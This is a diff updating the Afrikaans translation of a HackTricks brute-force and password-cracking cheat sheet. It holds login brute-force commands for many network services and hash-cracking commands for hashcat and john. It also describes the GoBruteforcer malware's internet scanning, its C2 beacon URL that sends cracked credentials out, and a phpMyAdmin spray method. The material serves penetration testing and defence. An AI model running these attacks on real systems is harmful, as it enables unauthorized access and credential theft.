@@ -1,10 +1,10 @@
-# Brute Force - CheatSheet
+# Brute Force - Kitsgids
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Verstekbewyse
+## Verstek-aanmeldbewyse
 
-**Soek op Google** vir verstekbewyse vir die tegnologie wat gebruik word, of **probeer hierdie skakels**:
+**Soek op Google** vir verstek-aanmeldbewyse vir die tegnologie wat gebruik word, of **probeer hierdie skakels**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -21,7 +21,7 @@
 
 ## **Skep jou eie woordeboeke**
 
-Vind soveel inligting as moontlik oor die teiken en genereer ’n pasgemaakte woordeboek. Gereedskap wat kan help:
+Vind soveel moontlik inligting oor die teiken en genereer ’n pasgemaakte woordeboek. Gereedskap wat kan help:
 
 ### Crunch
 
@@ -59,7 +59,7 @@ python3 cupp.py -h
 
 ### [Wister](https://github.com/cycurity/wister)
 
-’n wordlist-generatornutsding waarmee jy ’n stel woorde kan invoer en verskeie variasies daarvan kan skep, om ’n unieke en ideale wordlist vir ’n spesifieke teiken saam te stel.
+’n wordlist-genereringnutsding waarmee jy ’n stel woorde kan invoer en verskeie variasies daarvan kan skep, sodat jy ’n unieke en geskikte wordlist vir ’n spesifieke teiken kan saamstel.
 
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
@@ -95,15 +95,15 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Internetwye bruteforcer-werkvloei (lesse van Go-gebaseerde skandeerders)
+## Internetwye bruteforcer-werkvloei (lesse uit Go-gebaseerde skandeerders)
 
-Die volgende gedrag is waargeneem in die skanderingswerkvloei van die GoBruteforcer-wanware; presiese waardes is spesifiek vir die voorbeeld.<sup>[[1]](#references)</sup>
+Die volgende gedrag is in die skandeerwerkvloei van die GoBruteforcer-malware waargeneem; presiese waardes is steekproefspesifiek.<sup>[[1]](#references)</sup>
 
-- Gebruik **werkerpoele wat vir die argitektuur ingestel is** (byvoorbeeld 95 gelyktydige werkers op `x86_64/arm64`, 85 op `i686`, 35 op `armv5tel` en by verstek 50 op ander argitekture), kontroleer aktiewe werkers elke sekonde en begin vervangings wanneer die aantal onder die teiken daal; elke werker hanteer hoogstens een teiken-IP voordat dit stop.
-- Genereer **ewekansige openbare IPv4-adresse**, maar sluit duidelik nie-roeteerbare reekse en uitgesoekte reekse wat die operateur vermy uit: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, wolk-intensiewe `/8`-reekse (`3/15/16/56`) en `/8`-reekse wat met die Amerikaanse Departement van Verdediging geassosieer word (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Toets die dienspoort** met ’n kort uitteltyd (~2s) voordat **cleartext-aanmeldings** probeer word (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin oor HTTP/80), en gebruik ’n **klein ingeboude lys van geloofsbriewe** as die C2-aflaai van geloofsbriewe misluk.
-- **Eksfiltreer treffers** via klein HTTP GET-seine, soos `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (dienskodes soos `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), en hergebruik ’n algemene blaaier-User-Agent om in te meng.
-- **phpMyAdmin-sproei-aanvalle** kan sowat 80 waarskynlike paaie met `GET /index.php?lang=en` brute-force, PMA-merkers (`pmahomme`-tema/`phpmyadmin.css`/`navigation.php`) opspoor en `codemirror.css?v=X.Y.Z` ontleed om die verifikasiepad te bepaal: weergawes `<4.9` aanvaar GET-parameters `pma_username`/`pma_password`; weergawes `>=4.9` gebruik POST met `server=1`, CSRF-`token` en dieselfde geloofsbriewe.
+- Handhaaf **argitektuur-ingestelde worker-poele** (byvoorbeeld 95 gelyktydige workers op `x86_64/arm64`, 85 op `i686`, 35 op `armv5tel` en 50 by verstek op ander argitekture), kontroleer aktiewe workers elke sekonde en begin plaasvervangers wanneer die aantal onder die teiken daal; elke worker hanteer hoogstens een teiken-IP voordat dit afsluit.
+- Genereer **ewekansige openbare IPv4-adresse**, maar sluit ooglopende onroeteerbare en sekere operateur-vermyde reekse uit: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, wolk-intensiewe `/8`s (`3/15/16/56`) en DoD-geassosieerde `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Toets die dienspoort** met ’n kort uitteltyd (~2s) voordat **cleartext-aanmeldings** probeer word (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin oor HTTP/80), en gebruik ’n **klein ingeboude lys geloofsbriewe** as die C2-afhaal daarvan misluk.
+- **Eksfiltreer treffers** via klein HTTP GET-seinboodskappe soos `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (dienskodes soos `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), terwyl ’n algemene blaaier-User-Agent hergebruik word om in die verkeer op te gaan.
+- **phpMyAdmin-sproei-aanvalle** kan ongeveer 80 waarskynlike paaie brute-force met `GET /index.php?lang=en`, PMA-merkers (`pmahomme`-tema/`phpmyadmin.css`/`navigation.php`) opspoor en `codemirror.css?v=X.Y.Z` ontleed om die verifikasiepad te kies: weergawes `<4.9` aanvaar GET-parameters `pma_username`/`pma_password`; weergawes `>=4.9` gebruik POST met `server=1`, CSRF `token` en dieselfde geloofsbriewe.
 
 ## Dienste
 
@@ -204,9 +204,9 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 # Use https-post-form mode for https
 ```
 
-Vir http**s** moet jy van "http-post-form" na "**https-post-form**" verander
+Vir http**s** moet jy van "http-post-form" na "**https-post-form" verander
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla of (D)rupal of (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
 
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
@@ -345,13 +345,13 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
 
-Om **oracle_login** met **patator** te gebruik, moet jy die volgende **installeer**:
+Om **oracle_login** met **patator** te gebruik, moet jy installeer:
 
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
 
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
+[Vanlyn OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
 
 ```bash
  nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
@@ -513,11 +513,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 
 #### Swak SSH-sleutels / Debian voorspelbare PRNG
 
-Sommige stelsels het bekende foute in die ewekansige saad wat gebruik word om kriptografiese materiaal te genereer. Dit kan die sleutelruimte dramaties verklein, sodat dit met tools soos [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gebruteforce kan word. Vooraf gegenereerde stelle swak sleutels is ook beskikbaar, soos [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Sommige stelsels het bekende foute in die ewekansige saad wat gebruik word om kriptografiese materiaal te genereer. Dit kan lei tot ’n drasties verkleinde sleutelruimte wat met nutsprogramme soos [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) met brute force deurgesoek kan word. Vooraf gegenereerde versamelings swak sleutels is ook beskikbaar, soos [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ en OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-Die STOMP-teksprotokol is ’n wyd gebruikte boodskapprotokol wat **naatlose kommunikasie en interaksie met gewilde boodskapry-dienste moontlik maak**, soos RabbitMQ, ActiveMQ, HornetQ en OpenMQ. Dit bied ’n gestandaardiseerde en doeltreffende manier om boodskappe uit te ruil en verskeie boodskapbewerkings uit te voer.
+Die STOMP-teksprotokol is ’n wyd gebruikte boodskapprotokol wat **naatlose kommunikasie en interaksie met gewilde boodskapry-dienste moontlik maak**, soos RabbitMQ, ActiveMQ, HornetQ en OpenMQ. Dit bied ’n gestandaardiseerde en doeltreffende benadering om boodskappe uit te ruil en verskeie boodskapbewerkings uit te voer.
 
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
@@ -564,23 +564,23 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 
 
-## Lokaal
+## Plaaslik
 
 ### Aanlyn cracking-databasisse
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 met/sonder ESS/SSP en met enige challenge se waarde)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2-captures en argiewe soos MSOffice, ZIP, PDF...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 met/sonder ESS/SSP en met enige challenge-waarde)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2-captures en argiewe: MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hashes en lêerhashes)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes en lêer-hashes)
 - [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
 - [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Kyk hierna voordat jy probeer om ’n Hash met brute force te kraak.
+Kyk hierna voordat jy probeer om 'n Hash te brute force.
 
 ### ZIP
 
@@ -602,7 +602,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 
 #### Known plaintext zip attack
 
-Jy moet die **plaintext** (of ’n deel van die plaintext) **van ’n lêer in** die geënkripteerde zip ken. Jy kan die **lêername en groottes van lêers in** ’n geënkripteerde zip nagaan deur die volgende uit te voer: **`7z l encrypted.zip`**\
+Jy moet die **plaintext** (of ’n deel van die plaintext) van ’n lêer ken wat in die geënkripteerde zip-lêer vervat is. Jy kan die **lêername en groottes van lêers wat in ’n geënkripteerde zip-lêer vervat is** nagaan deur die volgende uit te voer: **`7z l encrypted.zip`**\
 Laai [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) van die releases-bladsy af.
 
 ```bash
@@ -643,7 +643,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 
 ### PDF-eienaarwagwoord
 
-Om ’n PDF-eienaarwagwoord te kraak, kyk hier: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Om 'n PDF-eienaarwagwoord te kraak, kyk hier: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 
@@ -685,7 +685,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
 
-### Lucks-beeld
+### Lucks image
 
 #### Metode 1
 
@@ -719,7 +719,7 @@ Nog ’n Luks BF-tutoriaal: [http://blog.dclabs.com.br/2020/03/bruteforcing-linu
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
 
-### PGP/GPG private sleutel
+### PGP/GPG-privaatsleutel
 
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
@@ -732,13 +732,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Gebruik [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) en gebruik dan john
+Gebruik [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) en daarna john
 
-### Open Office Pwd-beskermde kolom
+### Open Office-wagwoordbeskermde kolom
 
-As jy 'n xlsx-lêer met 'n kolom het wat met 'n wagwoord beskerm is, kan jy die beskerming daarvan verwyder:
+As jy ’n xlsx-lêer het met ’n kolom wat deur ’n wagwoord beskerm word, kan jy die beskerming verwyder:
 
-- **Laai dit na Google Drive op**, en die wagwoord sal outomaties verwyder word
+- **Laai dit op na Google Drive**, en die wagwoord sal outomaties verwyder word
 - Om dit **handmatig te verwyder**:
 
 ```bash
@@ -770,16 +770,16 @@ hash-identifier
 > <HASH>
 ```
 
-### Wordlists
+### Woordlyste
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Wordlist-genereringsnutsgoed**
+### **Gereedskap vir woordlys-generering**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gevorderde keyboard-walk-generator met konfigureerbare basiskarakters, sleutelborduitleg en roetes.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gevorderde keyboard-walk-generator met konfigureerbare basischars, sleutelborduitleg en roetes.
 
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
@@ -796,20 +796,48 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 ### Hashcat
 
-#### Hashcat attacks
+#### Hashcat-aanvalle
 
-- **Wordlist attack** (`-a 0`) met rules
+- **Woordelysaanval** (`-a 0`) met reëls
 
-**Hashcat** kom reeds met ’n **lêergids wat rules bevat**, maar jy kan [**ander interessante rules hier vind**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** kom reeds met ’n **gids wat reëls bevat**, maar jy kan [**ander interessante reëls hier vind**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 
+#### Verduidelik en profileer reëllêers
+
+Hashcat-reëls voer opcodes van links na regs uit. Dit is maklik om verkeerd te lees wanneer bewerkings op posisie nul plaasvind: `^e ^h ^t` voeg eers `e`, dan `h` en dan `t` vooraan, en verander dus `password` in `thepassword`. Substitusies vergelyk grepe en is hooflettergevoelig, dus doen ’n reël soos `sa@` niks aan ’n hoofletter-`A` nie. Toets onbekende reëls met verteenwoordigende basiswoorde in kleinletters, hoofletters en ’n mengsel daarvan voordat jy GPU-tyd daaraan bestee.<sup>[[6]](#references)[[9]](#references)</sup>
+
+[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) kan elke tussenliggende kandidaat wys en ’n opsomming gee van die opcode-verspreiding in ’n volledige reëllêer. Statiese opcode-tellings wys of ’n lêer meestal karakters aanheg, vooraan byvoeg, vervang of afkap. Dit bewys nie dat ’n reël ’n wagwoord sal kraak nie, maar help om ’n reëlstel te kies wat by die waargenome wagwoordpatrone van die teikenpopulasie pas.<sup>[[6]](#references)[[9]](#references)</sup>
+
+```bash
+uv tool install git+https://github.com/bandrel/HashcatRosetta.git
+hashcat-rosetta --explain '^e ^h ^t' --baseword password
+hashcat-rosetta rules.rule --analyze-rules
+```
+
+#### Verminder oortollige reëls met debug-logs
+
+Hashcat se debug-modus teken reëltransformasies apart van gewone status- en resultaatuitvoer aan. Modus `4` skryf `baseword:rule:candidate`; modus `5` voeg die bronwoordelys by. Stel altyd `--debug-file` eksplisiet in. Anders maak Hashcat `hashcat.debugfile` in sy profielgids oop, en vang die herleiding van stdout die konsole-uitvoer vas eerder as hierdie rekords. Debug-lêers word in byvoegmodus oopgemaak, dus verwyder of roteer ’n ou lêer voor ’n nuwe meting, en beskerm dit omdat dit gewone-teks-basewords en kandidate bevat.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+
+```bash
+rm -f debug.txt
+hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
+  -r rules.rule hashes.txt wordlist.txt
+hashcat-rosetta debug.txt --rules --metric candidates --top 25
+hashcat-rosetta debug.txt --basewords --detail
+hashcat-rosetta debug.txt --wordlists --detail
+hashcat-rosetta debug.txt --export report.json --format json
+```
+
+Gebruik `frequency` om reëls te vind wat die meeste toegepas word, `basewords` om die dekking van unieke invoere te meet, en `candidates` om unieke uitsette te tel. Rangskikking van kandidate is gewoonlik die beste beginpunt om te verklein, want ’n reël wat dikwels toegepas word, kan steeds baie invoere na duplikaatkandidate laat saamval. Kopieer die reëls met die hoogste waarde na ’n kleiner lêer, voer dit weer teen die oorblywende hashes uit en vergelyk die verslae tussen lopies. Mode `5` wys ook of elke bron-wordlist nuttige basewords bydra; dwing ontleding af met `--debug-mode 4` of `--debug-mode 5` wanneer dubbelpunte in die data outomatiese opsporing dubbelsinnig maak.<sup>[[6]](#references)[[9]](#references)</sup>
+
 - **Wordlist combinator**-aanval
 
-Dit is moontlik om **2 wordlists met hashcat in 1 te kombineer**.\
-As lys 1 die woord **"hello"** bevat en die tweede 2 reëls met die woorde **"world"** en **"earth"** bevat, sal die woorde `helloworld` en `helloearth` gegenereer word.
+Dit is moontlik om **2 wordlists in 1 te kombineer** met hashcat.\
+As lys 1 die woord **"hello"** bevat en die tweede lys 2 reëls bevat met die woorde **"world"** en **"earth"**, sal die woorde `helloworld` en `helloearth` gegenereer word.
 
 ```bash
 # This will combine 2 wordlists
@@ -822,20 +850,20 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
 
-#### Grammargedrewe kombinasie-aanvalle (voorbeeld met geënkripteerde Office)
+#### Grammar-gedrewe combinator attacks (encrypted Office-voorbeeld)
 
-’n Wagwoord kan lank wees en verskeie karakterklasse bevat, maar steeds ’n klein **effektiewe soekruimte** hê as dit ’n bekende grammatika volg. Vir ’n geënkripteerde Office-dokument wat tydens ’n gemagtigde assessering verkry is, onttrek `office2john.py` die wagwoordverifikasierekord; dit maak plaaslike raaiwerk moontlik sonder aanlynsluitings, koersbeperkings of MFA. Dit omseil nie die dokument-enkripsie nie.<sup>[[2]](#references)[[5]](#references)</sup>
+’n Wagwoord kan lank wees en verskeie karakterklasse bevat, maar steeds ’n klein **effektiewe soekruimte** hê wanneer dit ’n bekende grammatika volg. Vir ’n encrypted Office-dokument wat tydens ’n gemagtigde assessering verkry is, onttrek `office2john.py` die wagwoordverifikasierekord; dit maak plaaslike raaiwerk moontlik sonder aanlyn sluitings, beperking van pogings of MFA. Dit omseil nie die dokument-enkripsie nie.<sup>[[2]](#references)[[5]](#references)</sup>
 
-Verwyder die lêernaamveld wat John vooraf byvoeg, sodat Hashcat slegs die verifikator ontvang:<sup>[[2]](#references)</sup>
+Verwyder die lêernaamveld wat John vooraf byvoeg, sodat Hashcat slegs die verifier ontvang:<sup>[[2]](#references)</sup>
 
 ```bash
 python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
 head -c 40 office.hash; echo
 ```
 
-Kies `-m` uit die onttrekte voorvoegsel eerder as uit die lêeruitbreiding. Hashcat koppel `$office$*2007*`, `$office$*2010*` en `$office$*2013*` aan modusse `9400`, `9500` en `9600`; legacy `$oldoffice$0/$1`- en `$oldoffice$3/$4`-rekords gebruik onderskeidelik modusse `9700` en `9800`.<sup>[[3]](#references)</sup>
+Kies `-m` op grond van die onttrekte voorvoegsel, nie die lêeruitbreiding nie. Hashcat koppel `$office$*2007*`, `$office$*2010*` en `$office$*2013*` aan modusse `9400`, `9500` en `9600`; ouer `$oldoffice$0/$1`- en `$oldoffice$3/$4`-rekords gebruik onderskeidelik modusse `9700` en `9800`.<sup>[[3]](#references)</sup>
 
-As inligting uit wagwoordhergebruik, beleide, wenke of mense wat die gebruiker ken ’n grammatika soos `<word><number><optional !><word>` onthul, maak die onafhanklik enumereerbare voorvoegsel die linkerwoordeboek. Hierdie voorbeeld toets getalle van `0` tot `99`; vervang die reeks en transformasies met bewyse uit die assessering.<sup>[[5]](#references)</sup>
+As inligting oor die hergebruik van wagwoorde, beleide, wenke of mense wat die gebruiker ken, ’n grammatika soos `<word><number><optional !><word>` onthul, skep die onafhanklik opnoembare voorvoegsel as die linkerwoordeboek. Hierdie voorbeeld toets getalle van `0` tot `99`; vervang die reeks en transformasies met bewyse uit die assessering.<sup>[[5]](#references)</sup>
 
 ```bash
 while IFS= read -r word; do
@@ -845,13 +873,13 @@ while IFS= read -r word; do
 done < words.txt > wordsAndNumbers.txt
 ```
 
-Hashcat-aanvalmodus `1` voeg elke reël van die regterwoordeboek by elke reël van die linkerwoordeboek, dus lewer lêers met `L` en `R` reëls `L × R` kandidate op voordat enige reëls toegepas word. Die volgende opdrag is spesifiek vir ’n ouer `$oldoffice$3/$4`-rekord; verander die modus vir ander Office-formate.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Hashcat-aanvalmodus `1` voeg elke reël van die regterwoordeboek by elke reël van die linkerwoordeboek, dus lewer lêers met onderskeidelik `L` en `R` reëls `L × R` kandidate op voordat enige reëls toegepas word. Die volgende opdrag is spesifiek vir ’n verouderde `$oldoffice$3/$4`-rekord; verander die modus vir ander Office-formate.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 ```bash
 hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
 ```
 
-Hierdie voorverwerkingspatroon kan na ander offline-verifieerbare formate veralgemeen word: lys slegs geloofwaardige hooflettergebruik, datums, skeidingstekens, syfers of leestekens vir een komponent, en kombineer dit dan met die oorblywende komponent eerder as om die nominale volle lengte brute-force te probeer.<sup>[[4]](#references)[[5]](#references)</sup>
+Hierdie voorverwerkingspatroon kan op ander vanlyn-verifieerbare formate toegepas word: lys slegs geloofwaardige variasies in hooflettergebruik, datums, skeidingstekens, syfers of leestekens vir een komponent, en kombineer dit dan met die oorblywende komponent in plaas daarvan om die nominale volle lengte met brute force te probeer.<sup>[[4]](#references)[[5]](#references)</sup>
 
 - **Mask attack** (`-a 3`)
 
@@ -887,6 +915,16 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
 
+#### Valideer `.hcmask`-lêers voor 'n lopie
+
+'n Verkeerd geformateerde lyn kan tussen geldige maskers misgekyk word, daarom moet jy die volledige lêer en die beraamde sleutelruimte daarvan valideer voordat jy die aanval begin. HashcatRosetta rapporteer die lyn met die fout en gee 'n nie-nul-status terug wanneer enige masker ongeldig is, wat hierdie kontrole geskik maak vir scripts of CI.<sup>[[6]](#references)[[9]](#references)</sup>
+
+```bash
+hashcat-rosetta masks.hcmask --verify-masks
+```
+
+Moenie mask-lêers met generiese CSV- of teksontleders normaliseer nie. Hashcat ondersteun pasgemaakte karakterstelle `?1` tot `?8`, behandel `#` slegs as ’n opmerking wanneer dit die eerste byte is, en verwyder backslash-escapes in een deurloop voordat dit `?`-tokens interpreteer. Daarom is voorste witspasie voor `#` mask-data, en escaping kan bepaal of ’n reeks ’n letterlike waarde of ’n karakterstel-token is.<sup>[[6]](#references)[[9]](#references)</sup>
+
 - Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)-aanval
 
 ```bash
@@ -903,7 +941,7 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 
-Cracking Linux Hashes - /etc/shadow-lêer
+Cracking Linux Hashes - lêer /etc/shadow
 
 ```
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
@@ -919,7 +957,7 @@ Windows-hashes kraak
 1000 | NTLM                                             | Operating-Systems
 ```
 
-Cracking van algemene toepassingshashes
+Kraak van algemene toepassings-hashes
 
 ```
   900 | MD4                                              | Raw Hash
@@ -936,6 +974,10 @@ Cracking van algemene toepassingshashes
 - [1] [Binne GoBruteforcer: KI-gegenereerde bedienerstandaarde, swak wagwoorde en kripto-gefokusde veldtogte](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 - [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
 - [3] [Hashcat-voorbeeldhashes en Microsoft Office-modusse](https://hashcat.net/wiki/doku.php?id=example_hashes)
-- [4] [Hashcat combinator attack](https://hashcat.net/wiki/doku.php?id=combinator_attack)
-- [5] [Boedelbeplanning vir aanmeldbewyse](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [4] [Hashcat-kombineerderaanval](https://hashcat.net/wiki/doku.php?id=combinator_attack)
+- [5] [Boedelbeplanning van geloofsbriewe](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [6] [HashcatRosetta-bewaarplek](https://github.com/bandrel/HashcatRosetta)
+- [7] [Hashcat-foutlêerimplementering](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
+- [8] [Hashcat-opdragreël-hulp](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
+- [9] [HashcatRosetta: Lees die Rosetta-steen van wagwoordkraking](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
 {{#include ../banners/hacktricks-training.md}}
